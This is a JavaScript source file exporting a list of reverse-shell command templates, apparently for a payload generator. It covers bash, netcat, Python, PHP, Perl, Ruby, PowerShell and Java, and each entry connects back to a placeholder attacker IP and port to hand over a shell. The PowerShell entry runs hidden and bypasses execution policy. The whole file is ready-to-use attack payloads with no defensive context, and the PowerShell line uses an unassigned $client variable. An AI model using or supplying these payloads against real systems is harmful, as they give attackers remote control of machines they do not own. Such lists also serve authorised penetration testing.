export const REVERSE_SHELLS = [
  {
    name: "Bash (TCP)",
    type: "bash",
    command: "bash -i >& /dev/tcp/{{IP}}/{{PORT}} 0>&1"
  },
  {
    name: "Bash (UDP)",
    type: "bash",
    command: "sh -i >& /dev/udp/{{IP}}/{{PORT}} 0>&1"
  },
  {
    name: "Netcat (Traditional)",
    type: "nc",
    command: "nc -e /bin/sh {{IP}} {{PORT}}"
  },
  {
    name: "Netcat (OpenBSD)",
    type: "nc",
    command: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {{IP}} {{PORT}} >/tmp/f"
  },
  {
    name: "Python 3",
    type: "python",
    command: "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{{IP}}\",{{PORT}}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")'"
  },
  {
    name: "PHP (Exec)",
    type: "php",
    command: "php -r '$sock=fsockopen(\"{{IP}}\",{{PORT}});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
  },
  {
    name: "Perl",
    type: "perl",
    command: "perl -e 'use Socket;$i=\"{{IP}}\";$p={{PORT}};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
  },
  {
    name: "Ruby",
    type: "ruby",
    command: "ruby -rsocket -e'f=TCPSocket.open(\"{{IP}}\",{{PORT}}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
  },
  {
    name: "PowerShell",
    type: "powershell",
    command: "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{{IP}}\",{{PORT}});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
  },
  {
    name: "Java",
    type: "java",
    command: "r = Runtime.getRuntime()\np = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{{IP}}/{{PORT}};cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[])\np.waitFor()"
  }
];
